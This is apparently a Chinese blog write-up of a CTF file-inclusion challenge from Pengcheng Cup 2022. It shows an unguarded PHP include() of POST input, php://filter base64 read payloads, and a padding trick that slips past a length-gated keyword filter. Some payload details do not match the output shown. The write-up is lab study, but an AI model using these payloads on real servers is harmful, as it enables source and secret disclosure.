---
title: "鹏程杯2022-文件包含"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/靶场实例/文件包含/CTF/鹏程杯2022-文件包含/
categories:
  - 网安笔记
  - 靶场实例
  - 文件包含
  - CTF
  - 鹏程杯2022-文件包含
tags:
  - Study
---

首先看一遍代码  
```php
<?php   
highlight_file(__FILE__);  
include($_POST["flag"]);  
//flag in /var/www/html/flag.php;
```  
能获得的信息是使用POST传flag，flag目录/var/www/html/flag.php

先使用post来尝试读取该flag.php  
```txt
flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

```php
nssctf waf! `
<?php    
highlight_file(__FILE__);   
include($_POST["flag"]);   
//flag in /var/www/html/flag.php;`

```  
发现报错什么waf!

那就查看一下源码index.php，看看有什么条件  
```txt
flag=php://filter/read=convert.base64-encode/resource=index.php
```  
拿获取到的base64拿去解密  
```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
?>

<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php&nbsp;<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />include(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);<br /></span><span style="color: #FF8000">//flag&nbsp;in&nbsp;/var/www/html/flag.php;</span>
</span>
</code><br />

```  
我们浅读一下，巴拉巴拉巴拉，使用POST传flag，preg_match过滤了flag，前面还有一个<800规则  
也就是我输入的字符串要有800个字符才能读取到，那么我们可以使用&符号构造一条语句  
```txt
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&flag=php://filter/read=convert.base64-encode/resource=index.php
```  
那么现在来试一下  
```php
	PD9waHAgPSdOU1NDVEZ7MDE4MTc1YTEtMzg1Yy00ODAxLWE5YWYtMDUxZjU2NGM4OTI2fSc7Cg== `
	<?php   
	 highlight_file(__FILE__);   
	 include($_POST["flag"]);   
	 //flag in /var/www/html/flag.php;`
```  
发现成功获取base64，拿去解密  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/29/2c4e4180c1.jpg)获得flag
